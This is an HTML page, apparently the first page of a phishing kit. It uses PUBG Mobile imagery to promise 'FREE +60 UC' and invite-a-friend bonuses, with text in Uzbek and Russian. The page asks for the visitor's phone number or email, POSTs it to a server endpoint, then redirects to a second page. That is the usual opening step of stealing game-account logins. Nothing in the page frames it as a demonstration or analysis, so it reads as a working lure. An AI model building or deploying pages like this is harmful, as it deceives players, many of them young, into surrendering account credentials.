<!DOCTYPE html>
<html>
<head>
    <title>Chat</title>

    <!-- Telefon uchun muhim -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: url("https://upload.wikimedia.org/wikipedia/ru/thumb/7/7e/PlayerUnknown%27s_Battlegrounds_Mobile.jpg/960px-PlayerUnknown%27s_Battlegrounds_Mobile.jpg") no-repeat center center/cover;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            position: relative;
        }

        /* 🔥 OVERLAY */
        body::before {
            content: "";
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,0.65);
            z-index: 0;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
            position: relative;
            z-index: 1;
            backdrop-filter: blur(12px);
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(0,0,0,0.8);
        }

        .left {
            flex: 1;
        }

        .logo {
            font-size: 26px;
            font-weight: bold;
            margin-bottom: 20px;
            line-height: 1.4;
        }

        /* 🔥 TITLE STYLE */
        .logo span {
            display: block;
            font-size: 34px;
            color: #00f2fe;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00f2fe;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* 💎 BONUS TEXT */
        .bonus {
            margin-bottom: 10px;
            color: #00f2fe;
            font-size: 16px;
            font-weight: bold;
            text-shadow: 0 0 8px #00f2fe;
        }

        /* 🔥 INPUT */
        input {
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.75);
            border: 2px solid rgba(255,255,255,0.3);
            color: white;
            font-size: 18px;
            outline: none;
            backdrop-filter: blur(6px);
            box-shadow: 0 0 10px rgba(0,0,0,0.7);
            transition: 0.3s;
        }

        input::placeholder {
            color: rgba(255,255,255,0.7);
        }

        input:focus {
            border: 2px solid #00f2fe;
            box-shadow: 0 0 15px #00f2fe;
            background: rgba(0, 0, 0, 0.9);
        }

        .bottom {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
        }

        /* 🚀 BUTTON */
        button {
            background: linear-gradient(45deg, #4facfe, #00f2fe);
            border: none;
            padding: 12px 28px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            color: white;
            box-shadow: 0 0 15px rgba(0,242,254,0.7);
            transition: 0.3s;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(0,242,254,1);
        }

        /* 📱 TELEFON */
        @media (max-width: 768px) {
            body {
                align-items: flex-start;
                padding: 20px;
            }

            .main {
                width: 100%;
                height: auto;
                flex-direction: column;
                padding: 20px;
            }

            .left {
                margin-bottom: 30px;
            }

            .logo span {
                font-size: 26px;
            }

            input {
                font-size: 16px;
                padding: 14px;
            }

            .bottom {
                justify-content: center;
            }

            button {
                width: 100%;
                padding: 14px;
            }
        }
    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="logo">
            <span>💎 FREE +60 UC</span>
            Invite friends and earn UC instantly ✅<br>
            Har bir yuborgan odamingiz uchun bonus 💰
            <img src="https://i.playerok.com/j5WEQwfdF86Ut0cSVqOFJgcoockGJ5jiEsE9nwI043c/wm:0.8:soea:5:2:0.2/rs:fill:0:1000:0/g:no/quality:99/czM6Ly9wbGF5ZXJvay8vaW1hZ2VzLzFmMDg3ZWYwLTVlMTktNmExMC1jNWE4LWQwODM1N2E1YmQzYi5qcGVn.jpg" 
                 style="width:30px; height:30px; vertical-align:middle; margin-left:5px;">
        </div>
    </div>

    <div class="right">

        <div class="bonus">
            🎁 +60 UC BONUS
        </div>

        <input id="msg" placeholder="Телефон или эл. почта." autocomplete="on">

        <div class="bottom">
            <button onclick="send()">Далее</button>
        </div>

    </div>
</div>

<script>
window.onload = () => {
    document.getElementById("msg").focus();
};

function send() {
    const message = document.getElementById("msg").value;

    if (!message) {
        alert("Email yoz!");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
    })
    .then(() => {
        window.location.href = "/page2.html";
    });
}
</script>

</body>
</html>
